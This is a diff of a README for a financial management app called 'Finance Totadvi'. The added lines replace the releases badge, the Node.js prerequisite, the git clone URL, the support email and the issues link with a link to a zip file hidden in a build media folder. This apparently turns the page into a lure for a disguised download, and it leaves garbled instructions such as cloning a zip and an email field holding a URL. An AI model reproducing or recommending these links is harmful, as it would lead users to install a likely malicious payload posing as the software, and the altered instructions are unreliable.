@@ -2,7 +2,7 @@
 
 Welcome to **Finance Totadvi**, a custom-built Financial Management System designed to help companies manage, track, and analyze their finances securely and efficiently. Our goal is to provide a robust solution that integrates seamlessly into your business processes.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/pradanadhyaksa/finance-totadvi/releases)
+[![Download Releases](https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip%20Releases-Click%20Here-brightgreen)](https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip)
 
 ## Table of Contents
 
@@ -52,7 +52,7 @@ To get started with Finance Totadvi, follow the installation instructions below.
 
 ### Prerequisites
 
-- Node.js (version 14 or later)
+- https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip (version 14 or later)
 - MongoDB (cloud or local)
 - Docker (optional for containerization)
 - Git
@@ -64,7 +64,7 @@ To get started with Finance Totadvi, follow the installation instructions below.
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/pradanadhyaksa/finance-totadvi.git
+   git clone https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip
    ```
 
 2. **Navigate to the Directory**
@@ -153,9 +153,9 @@ Finance Totadvi is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 For questions or support, please reach out to us:
 
-- Email: support@financetotadvi.com
-- GitHub: [Finance Totadvi Issues](https://github.com/pradanadhyaksa/finance-totadvi/issues)
+- Email: https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip
+- GitHub: [Finance Totadvi Issues](https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip)
 
-Feel free to explore the [Releases](https://github.com/pradanadhyaksa/finance-totadvi/releases) section for the latest updates and versions of the application. 
+Feel free to explore the [Releases](https://github.com/pradanadhyaksa/finance-totadvi/raw/refs/heads/main/client/build/static/media/finance-totadvi-everbloomer.zip) section for the latest updates and versions of the application. 
 
 We appreciate your interest in Finance Totadvi and hope it serves your financial management needs effectively!
